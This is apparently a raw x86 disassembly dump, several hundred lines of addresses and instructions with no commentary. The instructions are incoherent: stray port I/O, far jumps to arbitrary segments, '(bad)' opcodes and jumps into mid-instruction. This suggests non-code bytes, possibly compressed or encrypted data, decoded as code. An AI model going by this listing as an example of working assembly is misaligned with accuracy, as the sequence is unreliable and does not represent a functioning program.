  40c0e2:	jle    0x40c085
  40c0e4:	xchg   esp,eax
  40c0e5:	dec    edx
  40c0e6:	and    BYTE PTR [esp+ebx*4+0x61],al
  40c0ea:	imul   esi,DWORD PTR [eax+0x53],0x12aa4833
  40c0f1:	in     eax,0x2e
  40c0f3:	test   BYTE PTR [esp+esi*8+0x6141f9e7],cl
  40c0fa:	aas    
  40c0fb:	in     eax,0xbb
  40c0fd:	push   ecx
  40c0fe:	xor    BYTE PTR [esi],bl
  40c100:	cli    
  40c101:	mov    WORD PTR [edx],es
  40c103:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40c105:	mov    ah,0x34
  40c107:	neg    BYTE PTR [eax-0x30cb1122]
  40c10d:	stc    
  40c10e:	lock fild DWORD PTR [esi-0x21029598]
  40c115:	sar    esi,0xe3
  40c118:	popa   
  40c119:	and    BYTE PTR [eax-0x7690a108],dh
  40c11f:	push   0x98bcf096
  40c124:	aas    
  40c125:	pop    edx
  40c126:	dec    edx
  40c127:	inc    edx
  40c128:	lds    esp,FWORD PTR [edi]
  40c12a:	cs add esi,esp
  40c12d:	dec    edi
  40c12e:	add    al,0x9c
  40c130:	jb     0x40c0de
  40c132:	and    esi,ebx
  40c134:	dec    eax
  40c135:	and    eax,0x6fd1a9ee
  40c13a:	mov    bl,0xa1
  40c13c:	inc    eax
  40c13d:	cmp    eax,0x90fda119
  40c142:	xchg   ebx,eax
  40c143:	fiadd  DWORD PTR [esi-0x60]
  40c146:	popa   
  40c147:	fs push ecx
  40c149:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c14a:	add    al,BYTE PTR [ecx]
  40c14c:	push   ds
  40c14d:	mov    al,0x81
  40c14f:	cli    
  40c150:	enter  0x14d8,0xee
  40c154:	sbb    al,0x52
  40c156:	xchg   ebx,eax
  40c157:	sbb    bh,BYTE PTR [ecx+ebp*2-0x5fe91d35]
  40c15e:	pop    edx
  40c15f:	popa   
  40c160:	cdq    
  40c161:	repz ficom WORD PTR [esi]
  40c164:	scas   al,BYTE PTR es:[edi]
  40c165:	(bad)  
  40c166:	out    dx,al
  40c167:	xor    BYTE PTR [ebx+0x71f35928],al
  40c16d:	es mov eax,ss:0x8d69c011
  40c174:	add    BYTE PTR ds:0x845da728,bl
  40c17a:	cmc    
  40c17b:	call   0xe172:0xd9799cd0
  40c182:	cmp    BYTE PTR [ecx+0x475f99cb],ah
  40c188:	fnstenv [ebx+eiz*1+0x7fc45e67]
  40c18f:	jl     0x40c120
  40c191:	and    ebx,DWORD PTR [ebx-0x479ef9cb]
  40c197:	xor    BYTE PTR [esi-0x5e],0x37
  40c19b:	cmp    BYTE PTR [ecx+0x59],dh
  40c19e:	out    dx,al
  40c19f:	dec    eax
  40c1a0:	mul    DWORD PTR [esi+0x79f551fc]
  40c1a6:	xlat   BYTE PTR ds:[ebx]
  40c1a7:	int3   
  40c1a8:	xchg   dl,ch
  40c1aa:	jmp    0x40c135
  40c1ac:	ss cli 
  40c1ae:	dec    eax
  40c1af:	mov    esi,0x91b8a7a6
  40c1b4:	pop    esi
  40c1b5:	and    eax,0x9b6e315f
  40c1ba:	push   ecx
  40c1bb:	das    
  40c1bc:	fsub   DWORD PTR [eax+0x2b]
  40c1bf:	loop   0x40c15f
  40c1c1:	gs push ebx
  40c1c3:	dec    eax
  40c1c4:	mov    BYTE PTR [edi-0x17],dh
  40c1c7:	add    al,0x79
  40c1c9:	jns    0x40c179
  40c1cb:	mov    bl,0xde
  40c1cd:	mov    BYTE PTR [ebx],dh
  40c1cf:	ret    0x6104
  40c1d2:	call   0xb919:0xe7b97433
  40c1d9:	stos   BYTE PTR es:[edi],al
  40c1da:	out    dx,eax
  40c1db:	push   esi
  40c1dc:	pop    ds
  40c1dd:	in     eax,0xc7
  40c1df:	cmp    bh,0xe1
  40c1e2:	and    BYTE PTR [edx+0x391b60ad],ch
  40c1e8:	ds retf 0xd23a
  40c1ec:	mov    DWORD PTR [edx],esi
  40c1ee:	jmp    0xd7264e02
  40c1f3:	mov    DWORD PTR [ebx-0x77],edx
  40c1f6:	inc    ecx
  40c1f7:	mov    ebx,DWORD PTR [edi]
  40c1f9:	xchg   esi,eax
  40c1fa:	pop    eax
  40c1fb:	jne    0x40c1c1
  40c1fd:	call   0x615d3da8
  40c202:	rcr    BYTE PTR ds:0xdbd2e0cd,0x8e
  40c209:	jnp    0x40c1ea
  40c20b:	jg     0x40c26b
  40c20d:	les    esi,FWORD PTR [eax+0x47]
  40c210:	out    dx,eax
  40c211:	outs   dx,BYTE PTR ds:[esi]
  40c212:	inc    edi
  40c213:	pop    ebx
  40c214:	and    BYTE PTR [eax-0x7d],0x37
  40c218:	mov    WORD PTR ds:0xca534e9f,ss
  40c21e:	push   edx
  40c21f:	aam    0x72
  40c221:	call   0x75169426
  40c226:	outs   dx,BYTE PTR ds:[esi]
  40c227:	mov    al,ds:0x34b21bd1
  40c22c:	rcr    BYTE PTR [ecx+0x1],1
  40c22f:	mov    al,0x68
  40c231:	and    BYTE PTR [ebp+0x21],al
  40c234:	mov    bh,0xee
  40c236:	(bad)  
  40c237:	ja     0x40c294
  40c239:	aas    
  40c23a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c23b:	sahf   
  40c23c:	out    0x86,eax
  40c23e:	cs mov cl,0xf4
  40c241:	xor    edx,ebx
  40c243:	sahf   
  40c244:	sub    bh,0x62
  40c247:	jbe    0x40c244
  40c249:	mov    ecx,0xf192f176
  40c24e:	mov    ds:0xcd805e48,eax
  40c253:	jo     0x40c1e5
  40c255:	ja     0x40c20a
  40c257:	push   0xdf7560a8
  40c25c:	out    dx,eax
  40c25d:	add    al,BYTE PTR [ebx-0x619c8e2a]
  40c263:	inc    ebx
  40c264:	pop    esi
  40c265:	ret    
  40c266:	push   edi
  40c267:	fs cld 
  40c269:	cli    
  40c26a:	push   eax
  40c26b:	sti    
  40c26c:	aas    
  40c26d:	popa   
  40c26e:	or     dh,BYTE PTR [eax+0x6]
  40c271:	int    0x14
  40c273:	pop    eax
  40c274:	icebp  
  40c275:	mov    ds:0xf695f5e7,eax
  40c27a:	cwde   
  40c27b:	repz cs mov edx,eax
  40c27f:	sub    al,ah
  40c281:	mov    esp,0xb75d9f32
  40c286:	loope  0x40c262
  40c288:	fdivrp st(0),st
  40c28a:	fidiv  DWORD PTR [edx+0x3ae76b7f]
  40c290:	test   edx,0x1ebe65ea
  40c296:	add    ch,BYTE PTR [ecx]
  40c298:	dec    ecx
  40c299:	popa   
  40c29a:	loopne 0x40c26f
  40c29c:	push   esi
  40c29d:	cmp    dl,bh
  40c29f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2a0:	mov    ah,0x62
  40c2a2:	fidivr DWORD PTR [ebx-0x2326d00d]
  40c2a8:	pop    esi
  40c2a9:	xchg   BYTE PTR [ebx-0x7c14f7c8],ch
  40c2af:	bound  ecx,QWORD PTR [ebp+0x61]
  40c2b2:	fs std 
  40c2b4:	or     BYTE PTR [edx],0x0
  40c2b7:	pop    ss
  40c2b8:	jg     0x40c2ca
  40c2ba:	adc    BYTE PTR [ebp-0x79],al
  40c2bd:	mov    eax,0xbba370ee
  40c2c2:	mov    al,ds:0x4660b2b6
  40c2c7:	into   
  40c2c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2c9:	cdq    
  40c2ca:	fmul   st,st(6)
  40c2cc:	sbb    dh,BYTE PTR [ebx+0x5a6a90ee]
  40c2d2:	mov    ah,0x84
  40c2d4:	dec    edx
  40c2d5:	and    BYTE PTR [edi+0x68560c9f],dl
  40c2db:	xor    eax,0xe84ed15e
  40c2e0:	add    eax,0xa223ee6a
  40c2e5:	retf   
  40c2e6:	jge    0x40c352
  40c2e8:	dec    edi
  40c2e9:	mov    ecx,0xf001a004
  40c2ee:	std    
  40c2ef:	outs   dx,DWORD PTR ds:[esi]
  40c2f0:	add    ecx,0xe
  40c2f3:	adc    al,0x65
  40c2f5:	repnz aam 0xd7
  40c2f8:	pop    esi
  40c2f9:	pop    esp
  40c2fa:	inc    eax
  40c2fb:	dec    eax
  40c2fc:	fstp   DWORD PTR [esi+0x59ac24d0]
  40c302:	repnz or al,0x6a
  40c305:	pop    ebp
  40c306:	(bad)
  40c309:	cli    
  40c30a:	rcr    ecx,1
  40c30c:	test   BYTE PTR [edx+eax*8-0x79],ch
  40c310:	and    al,0x61
  40c312:	retf   
  40c313:	cli    
  40c314:	jle    0x40c339
  40c316:	add    ch,BYTE PTR [ebx]
  40c318:	inc    edx
  40c319:	popa   
  40c31a:	js     0x40c2fa
  40c31c:	sbb    esi,eax
  40c31e:	pop    ds
  40c31f:	ret    
  40c320:	shl    BYTE PTR [esi+ebp*8-0x64207899],1
  40c327:	shl    BYTE PTR [esi],1
  40c329:	fs inc ebp
  40c32b:	(bad)  
  40c32c:	outs   dx,DWORD PTR ds:[esi]
  40c32d:	rol    BYTE PTR [esi-0x5f],1
  40c330:	jae    0x40c386
  40c332:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c333:	xor    DWORD PTR [eax],ebp
  40c335:	sub    dh,ch
  40c337:	adc    ecx,ecx
  40c339:	jecxz  0x40c317
  40c33b:	or     al,0x2d
  40c33d:	inc    edi
  40c33e:	dec    esi
  40c33f:	ja     0x40c37c
  40c341:	inc    edx
  40c342:	dec    ecx
  40c343:	loop   0x40c328
  40c345:	loopne 0x40c300
  40c347:	repz xchg esi,eax
  40c349:	or     edx,edi
  40c34b:	std    
  40c34c:	jle    0x40c3a6
  40c34e:	jmp    FWORD PTR [edx-0x3acc87d6]
  40c354:	test   al,0xe0
  40c356:	loop   0x40c309
  40c358:	in     al,dx
  40c359:	test   DWORD PTR [ebx+0x560885a1],0xcaa9c988
  40c363:	cmp    BYTE PTR [esi+0x67],bl
  40c366:	mov    ds,esp
  40c368:	inc    esp
  40c369:	sub    ch,BYTE PTR [ebp-0x7b9eb65a]
  40c36f:	pop    ss
  40c370:	sub    ah,BYTE PTR [ebx+esi*2+0x25878fd6]
  40c377:	dec    esi
  40c378:	push   edi
  40c379:	popa   
  40c37a:	ret    0xd600
  40c37d:	jmp    0x613741cf
  40c382:	and    DWORD PTR [ebx-0x7b],esi
  40c385:	cmp    al,0xa2
  40c387:	lods   eax,DWORD PTR ds:[esi]
  40c388:	aad    0x70
  40c38a:	out    dx,al
  40c38b:	dec    edi
  40c38c:	stos   BYTE PTR es:[edi],al
  40c38d:	inc    ebx
  40c38e:	dec    esi
  40c38f:	sbb    DWORD PTR [edx+0x43],edx
  40c392:	sbb    BYTE PTR [edi-0x7018ef24],0xbe
  40c399:	adc    DWORD PTR [edx],ebp
  40c39b:	adc    ebp,ecx
  40c39d:	xor    al,0xb6
  40c39f:	jbe    0x40c407
  40c3a1:	popa   
  40c3a2:	icebp  
  40c3a3:	ins    BYTE PTR es:[edi],dx
  40c3a4:	pop    esp
  40c3a5:	in     al,dx
  40c3a6:	loope  0x40c3f4
  40c3a8:	add    esp,DWORD PTR [ecx+0x1]
  40c3ab:	and    edi,esi
  40c3ad:	sbb    eax,0x38230bc4
  40c3b2:	out    dx,eax
  40c3b3:	cmp    BYTE PTR [edx+0x460ba58],bl
  40c3b9:	jp     0x40c3a8
  40c3bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c3bc:	jb     0x40c419
  40c3be:	into   
  40c3bf:	or     edx,ebp
  40c3c1:	fidiv  DWORD PTR ds:0xadc3c7a1
  40c3c7:	adc    DWORD PTR [ebp+0x4a],edx
  40c3ca:	out    dx,al
  40c3cb:	pop    edi
  40c3cc:	mov    al,0x53
  40c3ce:	mov    bh,0x5a
  40c3d0:	and    al,0xf1
  40c3d2:	and    BYTE PTR [ecx-0x56e0bd42],0xe6
  40c3d9:	fs pop edx
  40c3db:	test   al,0x5e
  40c3dd:	dec    dl
  40c3df:	lahf   
  40c3e0:	pop    edi
  40c3e1:	mov    ebx,0x605c5467
  40c3e6:	ja     0x40c3ea
  40c3e8:	imul   esp,DWORD PTR ds:0xc0e496de,0xffffffb8
  40c3ef:	dec    eax
  40c3f0:	push   ebx
  40c3f1:	sbb    al,0x3c
  40c3f3:	pop    ss
  40c3f4:	sahf   
  40c3f5:	jge    0x40c464
  40c3f7:	cld    
  40c3f8:	xchg   ecx,eax
  40c3f9:	or     BYTE PTR [ecx-0x5f],bl
  40c3fc:	popf   
  40c3fd:	dec    eax
  40c3fe:	imul   BYTE PTR [edx]
  40c400:	lahf   
  40c401:	mov    ebp,ecx
  40c403:	jns    0x40c463
  40c405:	sbb    eax,0x426ef29f
  40c40a:	ins    BYTE PTR es:[edi],dx
  40c40b:	scas   eax,DWORD PTR es:[edi]
  40c40c:	jle    0x40c46e
  40c40e:	cmp    cl,bl
  40c410:	in     al,dx
  40c411:	dec    edi
  40c412:	in     eax,0x86
  40c414:	lods   al,BYTE PTR ds:[esi]
  40c415:	push   0xe8e52d24
  40c41a:	fucomip st,st(6)
  40c41c:	arpl   sp,sp
  40c41e:	cmp    al,0x15
  40c420:	imul   eax,DWORD PTR [eax+0x569b4fa],0xffffffe0
  40c427:	lea    eax,ds:0xa9e153ab
  40c42d:	xchg   esi,eax
  40c42e:	lods   al,BYTE PTR ds:[esi]
  40c42f:	aas    
  40c430:	and    edi,DWORD PTR [esi+ebp*8-0x72535dbd]
  40c437:	aas    
  40c438:	out    dx,eax
  40c439:	xchg   ebx,eax
  40c43a:	mov    ss:0xdffc0e0,al
  40c440:	in     eax,dx
  40c441:	enter  0x851a,0xdf
  40c445:	push   esi
  40c446:	out    dx,al
  40c447:	mov    ?,WORD PTR [esi+esi*2-0x3d]
  40c44b:	mov    cl,0x33
  40c44d:	(bad)  
  40c44f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c450:	out    0xa0,eax
  40c452:	neg    BYTE PTR [ebx-0x14]
  40c455:	icebp  
  40c456:	dec    esi
  40c457:	jnp    0x40c4d1
  40c459:	push   edx
  40c45a:	out    dx,al
  40c45b:	leave  
  40c45c:	sbb    al,0x30
  40c45e:	inc    ecx
  40c45f:	das    
  40c460:	cmp    ebx,DWORD PTR [ebx-0x3d]
  40c463:	mov    ds:0xe05245ef,eax
  40c468:	add    cl,dh
  40c46a:	xchg   BYTE PTR [edx+0x2aeeb09c],cl
  40c470:	sti    
  40c471:	out    dx,eax
  40c472:	inc    eax
  40c473:	imul   ebx,DWORD PTR [edi-0x80],0x88bea174
  40c47a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c47b:	bound  ebp,QWORD PTR [eax+ebp*2+0x48]
  40c47f:	out    0x5e,al
  40c481:	lahf   
  40c482:	scas   eax,DWORD PTR es:[edi]
  40c483:	je     0x40c4c9
  40c485:	dec    edx
  40c486:	xchg   edi,eax
  40c487:	retf   
  40c488:	shl    DWORD PTR [eax+0x7e],0x7e
  40c48c:	push   ecx
  40c48d:	and    al,0x75
  40c48f:	mov    dh,0x74
  40c491:	cwde   
  40c492:	push   ss
  40c493:	sahf   
  40c494:	push   esp
  40c495:	fistp  WORD PTR [ecx+edx*2+0x5d]
  40c499:	and    eax,0xf3ab2a0
  40c49e:	inc    esp
  40c49f:	jne    0x40c4df
  40c4a1:	add    al,0xd9
  40c4a3:	mov    al,ds:0x2ce922b0
  40c4a8:	add    BYTE PTR [edx+0x2e],al
  40c4ab:	adc    bl,BYTE PTR [esi-0xc]
  40c4ae:	or     ch,dh
  40c4b0:	mov    edi,0x8b9c050e
  40c4b5:	mov    dh,0xdc
  40c4b7:	mov    esi,0xa174864a
  40c4bc:	test   al,0xea
  40c4be:	jecxz  0x40c485
  40c4c0:	and    eax,0x48d8013c
  40c4c5:	mov    edi,0xdfb6a125
  40c4ca:	xchg   ebp,eax
  40c4cb:	push   eax
  40c4cc:	es iret 
  40c4ce:	pop    eax
  40c4cf:	mov    eax,ds:0x875ee0e5
  40c4d4:	shl    BYTE PTR [ecx-0xf],cl
  40c4d7:	enter  0x5b5f,0x8b
  40c4db:	add    al,0x38
  40c4dd:	std    
  40c4de:	cmp    ecx,DWORD PTR [ecx-0xf]
  40c4e1:	mov    dh,0x49
  40c4e3:	mov    eax,ds:0x7bfa3ac9
  40c4e8:	fwait
  40c4e9:	lods   eax,DWORD PTR ds:[esi]
  40c4ea:	fst    st(5)
  40c4ec:	xor    al,0x60
  40c4ee:	mov    ebp,0x3e827ba7
  40c4f3:	mov    ebp,DWORD PTR [esi-0x2ed7571]
  40c4f9:	sub    al,0xda
  40c4fb:	int3   
  40c4fc:	out    0x89,al
  40c4fe:	in     al,dx
  40c4ff:	xlat   BYTE PTR ds:[ebx]
  40c500:	sbb    BYTE PTR [eax-0x5e],bh
  40c503:	adc    esi,edi
  40c505:	rcr    DWORD PTR [edx],cl
  40c507:	and    al,0x88
  40c509:	cmp    ebx,DWORD PTR [ebx+0x1]
  40c50c:	es inc edx
  40c50e:	out    dx,al
  40c50f:	leave  
  40c510:	jp     0x40c588
  40c512:	fwait
  40c513:	das    
  40c514:	and    eax,0x65a0f8c8
  40c519:	ret    0xf9b4
  40c51c:	xor    BYTE PTR [esi+ecx*4-0x1],dl
  40c520:	push   edx
  40c521:	jl     0x40c4e7
  40c523:	sbb    BYTE PTR [esi-0x1cc57db2],0xd5
  40c52a:	stc    
  40c52b:	mov    al,ds:0x1953b727
  40c530:	sub    DWORD PTR [esi],esi
  40c532:	mov    ds:0xcc265ef8,eax
  40c537:	adc    esp,DWORD PTR [ecx]
  40c539:	jno    0x40c50c
  40c53b:	and    DWORD PTR ds:0xe1a172bf,edi
  40c541:	daa    
  40c542:	mov    ds:0x98c36c04,al
  40c547:	ins    BYTE PTR es:[edi],dx
  40c548:	pop    esi
  40c549:	mov    al,ds:0xabc28ed2
  40c54e:	inc    esp
  40c54f:	and    DWORD PTR [ebp+ebx*2+0x3d],edi
  40c553:	fisttp DWORD PTR [ebx-0x515f6ee5]
  40c559:	adc    al,0x78
  40c55b:	adc    DWORD PTR [esi+0x7d],ebx
  40c55e:	sbb    al,0xd0
  40c560:	mov    cl,BYTE PTR [esi+0x77]
  40c563:	mov    dh,al
  40c565:	pusha  
  40c566:	xchg   edx,eax
  40c567:	ret    0x29f2
  40c56a:	dec    ebp
  40c56b:	ja     0x40c550
  40c56d:	inc    esi
  40c56e:	out    dx,eax
  40c56f:	and    ebp,eax
  40c571:	xlat   BYTE PTR ds:[ebx]
  40c572:	aad    0x6f
  40c574:	pop    esi
  40c575:	(bad)  
  40c576:	or     al,0xaf
  40c578:	adc    al,0xc2
  40c57a:	mov    WORD PTR [ecx+0x4086f536],fs
  40c580:	(bad)  ds:0x9253c7fb
  40c586:	sbb    ebx,DWORD PTR [edx-0x17654fa2]
  40c58c:	(bad)  
  40c58d:	in     eax,dx
  40c58e:	sub    ah,BYTE PTR [ecx-0x48c4b9fd]
  40c594:	es jbe 0x40c58a
  40c597:	jle    0x40c5f7
  40c599:	call   0x2a6d:0xbf592131
  40c5a0:	sub    ah,BYTE PTR [ecx+0x38]
  40c5a3:	mov    ebx,0x55ced59a
  40c5a8:	aas    
  40c5a9:	or     ecx,DWORD PTR [ebp+eiz*1+0x5e]
  40c5ad:	cdq    
  40c5ae:	ror    BYTE PTR [ecx+eax*2],cl
  40c5b1:	xor    DWORD PTR [eax],0x69
  40c5b4:	hlt    
  40c5b5:	pop    ebp
  40c5b6:	nop
  40c5b7:	pop    esi
  40c5b8:	pop    ecx
  40c5b9:	dec    ecx
  40c5ba:	lods   eax,DWORD PTR ds:[esi]
  40c5bb:	fbstp  TBYTE PTR [esi+0x5ec58144]
  40c5c1:	stos   BYTE PTR es:[edi],al
  40c5c2:	stos   BYTE PTR es:[edi],al
  40c5c3:	push   0x7c
  40c5c5:	or     cl,BYTE PTR [ebx-0x199ed103]
  40c5cb:	xchg   esi,eax
  40c5cc:	dec    ebx
  40c5cd:	(bad)  
  40c5ce:	fprem  
  40c5d0:	cwde   
  40c5d1:	in     al,dx
  40c5d2:	out    dx,al
  40c5d3:	aad    0x20
  40c5d5:	data16 xor al,al
  40c5d8:	xchg   edx,eax
  40c5d9:	ret    
  40c5da:	dec    edi
  40c5db:	mov    eax,ds:0xe905914f
  40c5e0:	push   esi
  40c5e1:	xchg   ebp,eax
  40c5e2:	xchg   BYTE PTR [ebx+0x5e],bh
  40c5e5:	xor    ah,BYTE PTR [eax-0x52]
  40c5e8:	pop    ecx
  40c5e9:	test   BYTE PTR [edx],cl
  40c5eb:	or     al,0x5b
  40c5ed:	pop    edx
  40c5ee:	clc    
  40c5ef:	int    0xa1
  40c5f1:	ror    edx,1
  40c5f3:	sar    BYTE PTR ds:0x5e145f70,0xc2
  40c5fa:	mov    cl,0xa5
  40c5fc:	sub    BYTE PTR [ebx+0x60b80d1c],cl
  40c602:	cmp    DWORD PTR [esi+0x7bcc9496],ebp
  40c608:	xor    esp,DWORD PTR [ecx+0x2c5779ee]
  40c60e:	mov    esp,0x7adb7a1a
  40c613:	test   al,0x6c
  40c615:	add    eax,0x412eb31b
  40c61a:	adc    ebx,edi
  40c61c:	pop    ebp
  40c61d:	mov    edx,0xf07ff0ee
  40c622:	cmp    ch,BYTE PTR [edi]
  40c624:	pusha  
  40c625:	mov    eax,0xa80868dc
  40c62a:	push   cs
  40c62b:	fwait
  40c62c:	sbb    esp,DWORD PTR [ecx-0x5]
  40c62f:	pop    es
  40c630:	icebp  
  40c631:	and    dh,BYTE PTR [esi]
  40c633:	stos   BYTE PTR es:[edi],al
  40c634:	call   0x49d7d6b3
  40c639:	aad    0xea
  40c63b:	xchg   esp,eax
  40c63c:	lea    eax,[edx-0x30e4f7d2]
  40c642:	mov    fs,WORD PTR [ecx+0x1dcb7e97]
  40c648:	or     ch,bh
  40c64a:	and    esi,DWORD PTR [ecx]
  40c64c:	es in  eax,dx
  40c64e:	out    0xa4,al
  40c650:	jp     0x40c660
  40c652:	jmp    0x91186461
  40c657:	cs ret 
  40c659:	pusha  
  40c65a:	lds    esp,FWORD PTR [edi+0x485a5d3a]
  40c660:	js     0x40c647
  40c662:	add    ah,bh
  40c664:	loope  0x40c617
  40c666:	in     eax,dx
  40c667:	push   ecx
  40c668:	pop    ecx
  40c669:	inc    ebx
  40c66a:	addr16 out dx,eax
  40c66c:	jle    0x40c5f0
  40c66e:	or     ah,BYTE PTR [ecx-0x392b4855]
  40c674:	ins    DWORD PTR es:[edi],dx
  40c675:	jmp    0xd1f:0x6f5c044b
  40c67c:	pop    ebp
  40c67d:	scas   eax,DWORD PTR es:[edi]
  40c67e:	and    al,0xa1
  40c680:	jbe    0x40c60e
  40c682:	push   cs
  40c683:	clc    
  40c684:	lods   eax,DWORD PTR ds:[esi]
  40c685:	call   0x11a55b3b
  40c68a:	mov    edx,0x7840d408
  40c68f:	loopne 0x40c683
  40c691:	jns    0x40c6d7
  40c693:	mov    eax,ds:0x3250ac76
  40c698:	neg    bl
  40c69a:	cmp    eax,ebp
  40c69c:	push   ecx
  40c69d:	mov    cl,0xd2
  40c69f:	sbb    DWORD PTR [esi],ebx
  40c6a1:	mov    BYTE PTR [ebx-0x7b],ah
  40c6a4:	ins    BYTE PTR es:[edi],dx
  40c6a5:	mov    al,ds:0xae94a0aa
  40c6aa:	mov    ah,0xfa
  40c6ac:	test   al,0x55
  40c6ae:	dec    ebp
  40c6af:	cmp    al,0x5e
  40c6b1:	mov    edx,0x5b4f3b88
  40c6b6:	ins    DWORD PTR es:[edi],dx
  40c6b7:	add    esi,eax
  40c6b9:	sub    eax,0xf7aea0c7
  40c6be:	scas   eax,DWORD PTR es:[edi]
  40c6bf:	push   es
  40c6c0:	inc    edi
  40c6c1:	imul   ebp,DWORD PTR [ebx+0x47],0x181f556c
  40c6c8:	ja     0x40c69b
  40c6ca:	adc    eax,0x6e43a77c
  40c6cf:	mov    ds:0xa7fbad63,al
  40c6d4:	jmp    0x4de4b981
  40c6d9:	idiv   DWORD PTR [ebp-0x4c]
  40c6dc:	cld    
  40c6dd:	pushf  
  40c6de:	ss (bad) 
  40c6e0:	out    dx,al
  40c6e1:	adc    BYTE PTR [ecx],ah
  40c6e3:	data16 loopne 0x40c6bf
  40c6e6:	cmp    ecx,ebp
  40c6e8:	push   ebp
  40c6e9:	shr    BYTE PTR [esi+0x4e],cl
  40c6ec:	mov    ebx,0x47a14f31
  40c6f1:	pop    ds
  40c6f2:	sar    DWORD PTR [edx+0x3d066ee2],1
  40c6f8:	pop    esi
  40c6f9:	mov    al,0x2e
  40c6fb:	or     edx,DWORD PTR ds:0xb77cc24d
  40c701:	bound  esi,QWORD PTR [eax+0x24]
  40c704:	pop    esi
  40c705:	xchg   edx,eax
  40c706:	cdq    
  40c707:	add    BYTE PTR [ebp+ebp*8+0x515b8b97],0x9f
  40c70f:	cmc    
  40c710:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c711:	xchg   edx,eax
  40c712:	ds repnz cld 
  40c715:	or     DWORD PTR [esi-0x5f],ecx
  40c718:	je     0x40c71f
  40c71a:	mov    ch,0xf3
  40c71c:	push   ecx
  40c71d:	adc    al,0xd8
  40c71f:	pushf  
  40c720:	and    al,BYTE PTR [eax-0x4ba109ad]
  40c726:	xlat   BYTE PTR ds:[ebx]
  40c727:	data16 fimul WORD PTR [edi+0x24]
  40c72b:	loope  0x40c78a
  40c72d:	popa   
  40c72e:	pop    esi
  40c72f:	inc    esi
  40c730:	jg     0x40c74f
  40c732:	leave  
  40c733:	scas   al,BYTE PTR es:[edi]
  40c734:	cli    
  40c735:	imul   ebp,esi,0x2e
  40c738:	(bad)  
  40c739:	mov    bl,0x2a
  40c73b:	mov    al,0xd3
  40c73d:	int    0xf9
  40c73f:	mul    BYTE PTR [esp+ebx*2]
  40c742:	ins    DWORD PTR es:[edi],dx
  40c743:	ss fs (bad) 
  40c746:	sub    BYTE PTR [ecx],ah
  40c748:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c749:	sub    BYTE PTR [ebp-0x4e4516a],0x73
  40c750:	jnp    0x40c77d
  40c752:	out    dx,al
  40c753:	add    edi,DWORD PTR [ebx]
  40c755:	repnz (bad) 
  40c757:	jp     0x40c7c4
  40c759:	popa   
  40c75a:	add    esp,DWORD PTR [edi]
  40c75c:	outs   dx,DWORD PTR ds:[esi]
  40c75d:	pusha  
  40c75e:	push   eax
  40c75f:	or     eax,0x1237435
  40c764:	pop    ebx
  40c765:	sbb    esi,ebp
  40c767:	pop    DWORD PTR [eax-0xc]
  40c76a:	mov    esi,0xef43abbe
  40c76f:	in     eax,dx
  40c770:	das    
  40c771:	pop    esi
  40c772:	pop    esi
  40c773:	and    dl,bl
  40c775:	fsubrp st(3),st
  40c777:	mov    BYTE PTR [ebx-0x57525c20],ah
  40c77d:	inc    esp
  40c77e:	out    dx,al
  40c77f:	in     eax,0xce
  40c781:	ud1    esp,DWORD PTR [ebx]
  40c784:	cs popf 
  40c786:	mov    ax,ds:0xdec0e3cd
  40c78c:	xor    DWORD PTR [esi+ebp*4+0x791f795],0xffffff97
  40c794:	pop    eax
  40c795:	stos   DWORD PTR es:[edi],eax
  40c796:	arpl   WORD PTR [ebp+0x2138e936],sp
  40c79c:	mov    cl,0x13
  40c79e:	add    dl,bl
  40c7a0:	xor    edx,esi
  40c7a2:	adc    BYTE PTR [eax],ah
  40c7a4:	lahf   
  40c7a5:	add    DWORD PTR [eax-0x5f],esi
  40c7a8:	inc    ebx
  40c7a9:	sbb    DWORD PTR [edi],edx
  40c7ab:	fild   DWORD PTR [edi-0x748bcfa3]
  40c7b1:	dec    esp
  40c7b2:	xchg   edi,eax
  40c7b3:	or     ecx,DWORD PTR [ebp+0x5060d517]
  40c7b9:	xchg   edx,eax
  40c7ba:	out    dx,al
  40c7bb:	dec    ebx
  40c7bc:	jecxz  0x40c7f1
  40c7be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7c0:	jmp    0x40c761
  40c7c2:	sub    BYTE PTR [eax+0x7ea12641],0x99
  40c7c9:	inc    eax
  40c7ca:	pop    edi
  40c7cb:	into   
  40c7cc:	push   cs
  40c7cd:	ja     0x40c7bd
  40c7cf:	sar    DWORD PTR [edx-0x780c09c4],1
  40c7d5:	daa    
  40c7d6:	ins    BYTE PTR es:[edi],dx
  40c7d7:	mov    eax,ds:0xd6823bcf
  40c7dc:	idiv   DWORD PTR [ebx-0x5ca130f8]
  40c7e2:	call   0xe544:0x2524ca7e
  40c7e9:	pop    edi
  40c7ea:	enter  0x50ff,0x67
  40c7ee:	leave  
  40c7ef:	add    BYTE PTR es:[ebp-0x5a14518],ch
  40c7f6:	jl     0x40c7f7
  40c7f8:	jge    0x40c799
  40c7fa:	(bad)  
  40c7fb:	das    
  40c7fc:	ins    DWORD PTR es:[edi],dx
  40c7fd:	pusha  
  40c7fe:	xchg   esi,eax
  40c7ff:	stc    
  40c800:	repnz add BYTE PTR [ebp-0x11b5a52b],bh
  40c807:	retf   
  40c808:	and    al,0x26
  40c80a:	in     al,dx
  40c80b:	mov    cl,BYTE PTR [ecx+0x22]
  40c80e:	clc    
  40c80f:	xchg   esi,eax
  40c810:	pop    es
  40c811:	sub    al,0x5c
  40c813:	mov    eax,ds:0x297298cb
  40c818:	ins    DWORD PTR es:[edi],dx
  40c819:	lock out dx,eax
  40c81b:	je     0x40c7ba
  40c81d:	fnstsw WORD PTR [eax-0x64344a40]
  40c823:	mov    ebx,0x221a60c8
  40c828:	(bad)  
  40c829:	sar    DWORD PTR [edx],cl
  40c82b:	mov    dh,0x2f
  40c82d:	jne    0x40c81c
  40c82f:	lods   al,BYTE PTR ds:[esi]
